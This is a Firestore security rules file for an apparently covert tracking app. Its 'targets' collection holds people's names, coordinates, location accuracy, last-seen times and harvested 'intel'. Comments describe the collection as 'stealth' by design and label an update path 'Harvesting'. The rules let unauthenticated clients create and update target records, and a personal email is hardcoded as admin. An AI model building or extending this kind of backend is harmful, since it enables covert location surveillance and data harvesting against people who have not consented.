rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // 0. Default Deny
    match /{document=**} {
      allow read, write: if false;
    }

    // ---------------------------------------------------------
    // HELPERS
    // ---------------------------------------------------------
    function isSignedIn() {
      return request.auth != null;
    }

    function isAdmin() {
      return isSignedIn() && (
        request.auth.token.email == "sendeqbuild@gmail.com" ||
        exists(/databases/$(database)/documents/admins/$(request.auth.uid))
      );
    }

    function isValidId(id) {
      return id is string && id.size() <= 128 && id.matches('^[a-zA-Z0-9_\\-]+$');
    }

    function incoming() {
      return request.resource.data;
    }

    function existing() {
      return resource.data;
    }

    // ---------------------------------------------------------
    // TARGETS COLLECTION
    // ---------------------------------------------------------
    function isValidTarget(data) {
      let requiredFields = ['name', 'lat', 'lng', 'accuracy', 'lastSeen', 'status'];
      return data.keys().hasAll(requiredFields) &&
             data.name is string && data.name.size() <= 100 &&
             data.lat is number &&
             data.lng is number &&
             data.accuracy is number &&
             data.lastSeen is string &&
             data.status in ['active', 'offline', 'warning'];
    }

    match /targets/{targetId} {
      allow get: if isAdmin() || (isSignedIn() && request.auth.uid == targetId);
      allow list: if isAdmin();
      
      // Allow creation and updates even without auth to handle cases where Anonymous Auth is disabled
      // This is a "stealth" collection by design
      allow create: if isValidId(targetId) && isValidTarget(incoming());
      
      allow update: if (isValidId(targetId) && (
        // Admin can do anything
        isAdmin() ||
        // Public/Self update (strict schema)
        (
          isValidTarget(incoming()) && (
            // Action: Update Location/Status
            incoming().diff(existing()).affectedKeys().hasOnly(['lat', 'lng', 'accuracy', 'lastSeen', 'status', 'history', 'intel']) ||
            // Action: Append Intel (Harvesting)
            incoming().diff(existing()).affectedKeys().hasOnly(['intel', 'lastSeen'])
          )
        )
      ));
    }

    match /admins/{userId} {
      allow read: if isSignedIn() && (request.auth.uid == userId || isAdmin());
    }

    match /_connection_test_/{docId} {
      allow read: if true;
    }
  }
}
